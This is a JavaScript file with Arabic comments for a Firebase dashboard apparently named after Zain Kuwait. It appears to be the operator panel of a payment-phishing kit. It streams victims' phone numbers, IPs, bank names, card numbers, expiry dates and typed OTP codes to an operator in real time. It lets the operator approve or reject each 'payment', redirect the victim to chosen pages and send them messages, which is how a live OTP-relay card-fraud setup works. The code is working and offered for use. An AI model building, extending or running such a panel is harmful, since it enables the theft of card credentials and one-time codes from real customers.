// ═══════════════════════════════════════════════════════════
// 📊 كود عملي لإنشاء لوحة تحكم Firebase متقدمة
// ═══════════════════════════════════════════════════════════

// 1️⃣ تهيئة Firebase
// ─────────────────────────────────────────────────────────

const firebaseConfig = {
  apiKey: "AIzaSyCw6S6m-6m-6m-6m-6m-6m-6m",
  authDomain: "zain-kw-admin.firebaseapp.com",
  databaseURL: "https://zain-kw-admin-default-rtdb.firebaseio.com",
  projectId: "zain-kw-admin",
  storageBucket: "zain-kw-admin.appspot.com"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const rtd = firebase.database();

// ═══════════════════════════════════════════════════════════
// 2️⃣ دوال قراءة البيانات من Firebase
// ═══════════════════════════════════════════════════════════

/**
 * دالة لجلب جميع الجلسات النشطة
 * استخدام: fetchAllSessions()
 */
function fetchAllSessions() {
  const sessionsRef = rtd.ref('sessions');
  
  sessionsRef.on('value', (snapshot) => {
    const sessions = snapshot.val() || {};
    console.log('جميع الجلسات:', sessions);
    
    // عرض في جدول
    displaySessionsTable(sessions);
    
    // تحديث العداد
    document.getElementById('sessionCount').innerText = Object.keys(sessions).length;
  });
}

/**
 * دالة لعرض بيانات جلسة محددة
 * استخدام: viewSessionDetails('sess_abc123')
 */
function viewSessionDetails(sessionId) {
  const sessionRef = rtd.ref('sessions/' + sessionId);
  
  sessionRef.once('value', (snapshot) => {
    const sessionData = snapshot.val();
    
    if (!sessionData) {
      alert('الجلسة غير موجودة!');
      return;
    }
    
    // بناء تقرير مفصل
    let report = `
╔════════════════════════════════════════════╗
║         تقرير الجلسة الكامل                ║
╚════════════════════════════════════════════╝

📱 معلومات العميل:
├─ معرّف الجلسة: ${sessionData.id}
├─ رقم الهاتف: ${sessionData.phone || 'لم يتم الإدخال'}
├─ عنوان IP: ${sessionData.ip}
├─ البلد: ${sessionData.country}
└─ الجهاز: ${sessionData.device} - ${sessionData.browser}

💰 معلومات الدفع:
├─ المبلغ: ${sessionData.amount}
├─ الحالة: ${getStatusInArabic(sessionData.status)}
└─ الصفحة الحالية: ${sessionData.page}

⏰ معلومات التوقيت:
├─ وقت الإنشاء: ${sessionData.createdTime}
└─ آخر نشاط: ${new Date(sessionData.startTime).toLocaleTimeString('ar-EG')}
    `;
    
    // عرض المحاولات
    if (sessionData.attempts) {
      report += `\n💳 محاولات الدفع:\n`;
      for (let attemptId in sessionData.attempts) {
        let attempt = sessionData.attempts[attemptId];
        report += `
├─ المحاولة: ${attemptId}
│  ├─ البنك: ${attempt.bankName}
│  ├─ البطاقة: ${maskCardNumber(attempt.cardNumber)}
│  ├─ الصلاحية: ${attempt.expiry}
│  └─ الوقت: ${attempt.timestamp}
        `;
      }
    }
    
    // عرض رموز OTP
    if (sessionData.otps) {
      report += `\n🔐 رموز التحقق:\n`;
      for (let otpId in sessionData.otps) {
        let otp = sessionData.otps[otpId];
        report += `├─ ${otp.otp} - الوقت: ${otp.timestamp}\n`;
      }
    }
    
    console.log(report);
    document.getElementById('detailsContainer').innerHTML = `<pre>${report}</pre>`;
  });
}

/**
 * دالة لمراقبة الجلسات بشكل حي
 * استخدام: monitorSessionsLive()
 */
function monitorSessionsLive() {
  const sessionsRef = rtd.ref('sessions');
  
  sessionsRef.on('child_added', (snapshot) => {
    const sessionData = snapshot.val();
    console.log('✅ جلسة جديدة:', sessionData.id);
    console.log('IP:', sessionData.ip);
    console.log('الجهاز:', sessionData.device);
    
    // تنبيه الإداري
    playNotificationSound();
    addNotification(`جلسة جديدة من ${sessionData.device} - IP: ${sessionData.ip}`);
  });
  
  sessionsRef.on('child_changed', (snapshot) => {
    const sessionData = snapshot.val();
    console.log('🔄 تحديث الجلسة:', sessionData.id);
    console.log('النشاط الجديد:', sessionData.hasNewActivity);
    
    if (sessionData.hasNewActivity) {
      addNotification(`نشاط جديد في الجلسة: ${sessionData.id}`);
    }
  });
}

/**
 * دالة لجلب نشاط محدد
 * استخدام: getActivityLog('sess_abc123')
 */
function getActivityLog(sessionId) {
  const sessionRef = rtd.ref('sessions/' + sessionId);
  let activityLog = [];
  
  sessionRef.on('value', (snapshot) => {
    const sessionData = snapshot.val();
    
    // جمع جميع الأنشطة
    if (sessionData.attempts) {
      for (let id in sessionData.attempts) {
        activityLog.push({
          type: 'card_attempt',
          time: sessionData.attempts[id].timestamp,
          bank: sessionData.attempts[id].bankName
        });
      }
    }
    
    if (sessionData.otps) {
      for (let id in sessionData.otps) {
        activityLog.push({
          type: 'otp_entered',
          time: sessionData.otps[id].timestamp,
          otp: '***' // إخفاء الرمز الفعلي
        });
      }
    }
    
    // ترتيب حسب الوقت
    activityLog.sort((a, b) => new Date(a.time) - new Date(b.time));
    
    console.log('📋 سجل النشاط:', activityLog);
    return activityLog;
  });
}

// ═══════════════════════════════════════════════════════════
// 3️⃣ دوال الموافقة والرفض والتحكم
// ═══════════════════════════════════════════════════════════

/**
 * دالة للموافقة على الدفع
 * استخدام: approveTransaction('sess_abc123', 'عمّان للدفع')
 */
function approveTransaction(sessionId, bankName) {
  const approvalData = {
    action: 'APPROVE_PAYMENT',
    status: 'approved',
    message: 'تم الموافقة على الدفع بواسطة الإداري',
    timestamp: new Date().toLocaleTimeString('ar-EG'),
    approvedAt: new Date().getTime(),
    adminId: getCurrentAdminId(),
    approvedBank: bankName
  };
  
  // إرسال أمر الموافقة
  rtd.ref('commands/' + sessionId + '/approval').set(approvalData)
    .then(() => {
      console.log('✅ تم إرسال أمر الموافقة');
      
      // تحديث حالة الجلسة
      rtd.ref('sessions/' + sessionId).update({
        status: 'APPROVED',
        approvalTimestamp: new Date().getTime()
      });
      
      // إضافة في السجل
      logAdminAction(getCurrentAdminId(), 'APPROVE', sessionId);
      
      // إظهار رسالة للإداري
      showSuccessMessage('✅ تم الموافقة على الدفع');
    })
    .catch((error) => {
      console.error('❌ خطأ:', error);
      showErrorMessage('حدث خطأ في إرسال أمر الموافقة');
    });
}

/**
 * دالة لرفض الدفع
 * استخدام: rejectTransaction('sess_abc123', 'بيانات غير صحيحة')
 */
function rejectTransaction(sessionId, reason) {
  const rejectionData = {
    action: 'REJECT_PAYMENT',
    status: 'rejected',
    message: 'تم رفض الدفع',
    reason: reason,
    timestamp: new Date().toLocaleTimeString('ar-EG'),
    rejectedAt: new Date().getTime(),
    adminId: getCurrentAdminId()
  };
  
  // إرسال أمر الرفض
  rtd.ref('commands/' + sessionId + '/rejection').set(rejectionData)
    .then(() => {
      console.log('❌ تم إرسال أمر الرفض');
      
      // تحديث حالة الجلسة
      rtd.ref('sessions/' + sessionId).update({
        status: 'REJECTED',
        rejectionReason: reason,
        rejectionTimestamp: new Date().getTime()
      });
      
      // إضافة في السجل
      logAdminAction(getCurrentAdminId(), 'REJECT', sessionId, reason);
      
      // إظهار رسالة
      showSuccessMessage('❌ تم رفض الدفع');
    })
    .catch((error) => {
      console.error('❌ خطأ:', error);
      showErrorMessage('حدث خطأ في إرسال أمر الرفض');
    });
}

/**
 * دالة لتوجيه العميل إلى صفحة محددة
 * استخدام: redirectCustomer('sess_abc123', 'success.html')
 */
function redirectCustomer(sessionId, targetPage) {
  const redirectCommand = {
    action: 'REDIRECT_PAGE',
    targetPage: targetPage,
    timestamp: new Date().toLocaleTimeString('ar-EG'),
    adminId: getCurrentAdminId()
  };
  
  rtd.ref('commands/' + sessionId + '/redirect').set(redirectCommand)
    .then(() => {
      console.log(`📍 تم توجيه العميل إلى: ${targetPage}`);
      logAdminAction(getCurrentAdminId(), 'REDIRECT', sessionId, targetPage);
    });
}

/**
 * دالة لإرسال رسالة إلى العميل
 * استخدام: sendMessageToCustomer('sess_abc123', 'يرجى التحقق من البيانات')
 */
function sendMessageToCustomer(sessionId, message) {
  const messageData = {
    type: 'ADMIN_MESSAGE',
    message: message,
    timestamp: new Date().toLocaleTimeString('ar-EG'),
    adminId: getCurrentAdminId()
  };
  
  rtd.ref('messages/' + sessionId).push(messageData);
}

// ═══════════════════════════════════════════════════════════
// 4️⃣ دوال العرض والواجهة
// ═══════════════════════════════════════════════════════════

/**
 * عرض جدول بجميع الجلسات
 */
function displaySessionsTable(sessions) {
  let html = `
    <table class="admin-table">
      <thead>
        <tr>
          <th>رقم الجلسة</th>
          <th>رقم الهاتف</th>
          <th>المبلغ</th>
          <th>الجهاز</th>
          <th>الحالة</th>
          <th>IP</th>
          <th>الإجراء</th>
        </tr>
      </thead>
      <tbody>
  `;
  
  for (let sessionId in sessions) {
    let session = sessions[sessionId];
    html += `
      <tr class="status-${session.status.toLowerCase()}">
        <td>${sessionId}</td>
        <td>${session.phone || '-'}</td>
        <td>${session.amount}</td>
        <td>${session.device}</td>
        <td><span class="badge ${getStatusClass(session.status)}">${getStatusInArabic(session.status)}</span></td>
        <td>${session.ip}</td>
        <td>
          <button onclick="viewSessionDetails('${sessionId}')" class="btn btn-info">📋 التفاصيل</button>
          <button onclick="approveTransaction('${sessionId}', 'Unknown')" class="btn btn-success">✅ موافقة</button>
          <button onclick="showRejectDialog('${sessionId}')" class="btn btn-danger">❌ رفض</button>
        </td>
      </tr>
    `;
  }
  
  html += `
      </tbody>
    </table>
  `;
  
  document.getElementById('sessionsTable').innerHTML = html;
}

/**
 * إظهار نافذة الرفض
 */
function showRejectDialog(sessionId) {
  const reason = prompt('اختر السبب:\n1. بيانات غير صحيحة\n2. بطاقة منتهية الصلاحية\n3. رصيد غير كافي\n4. مريب (Suspicious)');
  
  if (reason) {
    rejectTransaction(sessionId, reason);
  }
}

/**
 * إضافة إخطار على الشاشة
 */
function addNotification(message) {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.innerHTML = `
    <div class="notification-content">
      <span>${message}</span>
      <button onclick="this.parentElement.parentElement.remove()">✕</button>
    </div>
  `;
  document.getElementById('notificationsContainer').appendChild(notification);
  
  // إزالة بعد 5 ثواني
  setTimeout(() => notification.remove(), 5000);
}

// ═══════════════════════════════════════════════════════════
// 5️⃣ دوال مساعدة
// ═══════════════════════════════════════════════════════════

/**
 * تحويل حالة الجلسة إلى العربية
 */
function getStatusInArabic(status) {
  const statuses = {
    'active': '🔴 نشط',
    'approved': '✅ معتمد',
    'rejected': '❌ مرفوض',
    'completed': '🎉 مكتمل',
    'APPROVED': '✅ معتمد',
    'REJECTED': '❌ مرفوض',
    'PENDING': '⏳ قيد الانتظار'
  };
  return statuses[status] || status;
}

/**
 * الحصول على فئة CSS للحالة
 */
function getStatusClass(status) {
  const classes = {
    'active': 'badge-warning',
    'approved': 'badge-success',
    'rejected': 'badge-danger',
    'completed': 'badge-info',
    'APPROVED': 'badge-success',
    'REJECTED': 'badge-danger',
    'PENDING': 'badge-warning'
  };
  return classes[status] || 'badge-secondary';
}

/**
 * إخفاء رقم البطاقة
 */
function maskCardNumber(cardNumber) {
  if (!cardNumber) return 'بدون بيانات';
  const lastFour = cardNumber.slice(-4);
  return `**** **** **** ${lastFour}`;
}

/**
 * الحصول على معرّف الإداري الحالي
 */
function getCurrentAdminId() {
  return localStorage.getItem('adminId') || 'admin_unknown';
}

/**
 * تسجيل إجراء الإداري
 */
function logAdminAction(adminId, action, sessionId, details = '') {
  const logData = {
    adminId: adminId,
    action: action,
    sessionId: sessionId,
    details: details,
    timestamp: new Date().getTime(),
    timeString: new Date().toLocaleTimeString('ar-EG')
  };
  
  rtd.ref('admin_logs/' + Date.now()).set(logData);
  console.log('📝 تم تسجيل الإجراء:', action);
}

/**
 * إظهار رسالة النجاح
 */
function showSuccessMessage(message) {
  const alert = document.createElement('div');
  alert.className = 'alert alert-success';
  alert.innerHTML = message;
  document.body.appendChild(alert);
  setTimeout(() => alert.remove(), 3000);
}

/**
 * إظهار رسالة الخطأ
 */
function showErrorMessage(message) {
  const alert = document.createElement('div');
  alert.className = 'alert alert-danger';
  alert.innerHTML = message;
  document.body.appendChild(alert);
  setTimeout(() => alert.remove(), 3000);
}

/**
 * تشغيل صوت التنبيه
 */
function playNotificationSound() {
  // استخدم صوت بسيط
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.value = 800;
  oscillator.type = 'sine';
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.5);
}

// ═══════════════════════════════════════════════════════════
// 6️⃣ تهيئة لوحة التحكم عند التحميل
// ═══════════════════════════════════════════════════════════

window.addEventListener('DOMContentLoaded', function() {
  console.log('🚀 تم تحميل لوحة التحكم');
  
  // بدء مراقبة الجلسات
  fetchAllSessions();
  monitorSessionsLive();
  
  // تحديث كل 5 ثواني
  setInterval(fetchAllSessions, 5000);
});

// ═══════════════════════════════════════════════════════════
// ✅ انتهى الملف
// ═══════════════════════════════════════════════════════════